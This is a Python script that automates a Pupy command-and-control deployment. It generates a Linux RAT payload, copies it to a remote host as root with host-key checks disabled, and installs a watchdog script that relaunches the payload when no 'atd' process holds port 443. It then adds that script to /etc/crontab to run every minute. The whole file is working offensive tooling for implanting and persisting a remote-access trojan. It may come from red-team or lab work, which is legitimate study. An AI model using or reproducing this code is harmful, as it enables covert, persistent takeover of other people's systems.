import subprocess
import os
import time


'''
Function to start pupy server
'''
def startPupy(venvpath, pupypath):
    print("Starting pupy server...")
    command = "x-terminal-emulator -e $SHELL -c "
    command = command + " \"" + venvpath + " " + pupypath + "\""
    pupycom = subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


'''
Function to generate payload
'''
def genPayload(venvpath, pupygenpath, payload, privk_path, rhost, rpath):
    # Generating payload using pupygen.py script
    print("Generating pupy payload...")
    command = venvpath +  " " + pupygenpath + " -O linux -A x64 -o " + payload
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("Copying payload to remote host...")
    copy = 'scp -o StrictHostKeyChecking=no -i ' + privk_path + ' ' + payload + ' root@' + rhost + ':' + rpath
    subprocess.run(copy, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


'''
Function to start payload generated
'''
def startPayload(file, privk_path, rhost, rpath):

    # Creating sh script to execute payload
    print("Creating script to persist payload")
    check = "echo \"if ! netstat -atunp | grep 443 | grep atd >/dev/null; then\n" + rpath + "\nfi\" >> " + file
    ebashrc = "ssh -o StrictHostKeyChecking=no -i " + privk_path + " root@" + rhost + " -t sh << \"EOF\"\n" + check + "\nEOF"
    subprocess.run(ebashrc, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Giving execution permisions to payload script
    execperm = "chmod 700 " + file
    giveperm = "ssh -o StrictHostKeyChecking=no -i " + privk_path + " root@" + rhost + " -t sh << \"EOF\"\n" + execperm + "\nEOF"
    subprocess.run(giveperm, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Adding script to crontab
    print("Editing crontab to add persisted payload")
    cron = 'ssh -o StrictHostKeyChecking=no -i ' + privk_path + ' root@' + rhost + ' -t "echo \'*/1 * * * * root ' + file + '\' >> /etc/crontab"'
    subprocess.run(cron, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def c2(host, venvpath, pupypath, pupygenpath, localpayload, privk_path, rpath, rfile):
    genPayload(venvpath, pupygenpath, localpayload, privk_path, host, rpath)
    startPupy(venvpath, pupypath)
    startPayload(rfile, privk_path, host, rpath)
